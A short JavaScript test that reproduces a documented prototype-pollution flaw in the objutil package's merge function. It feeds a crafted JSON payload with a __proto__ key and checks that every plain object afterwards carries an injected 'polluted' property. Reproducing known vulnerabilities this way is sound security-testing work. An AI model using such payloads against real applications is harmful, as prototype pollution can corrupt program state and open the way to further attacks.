//https://snyk.io/vuln/SNYK-JS-OBJUTIL-559496

test("prototype pollution in objutil", () => {
  const { merge, remove } = require("objutil");

  let a = { x: 1, y: { w: 1, z: 2 } };
  const malicious_payload = '{"__proto__":{"polluted":"yes"}}';

  expect({}.polluted).toBe(undefined);

  result = merge(a, JSON.parse(malicious_payload));

  expect({}.polluted).toBe("yes");
});
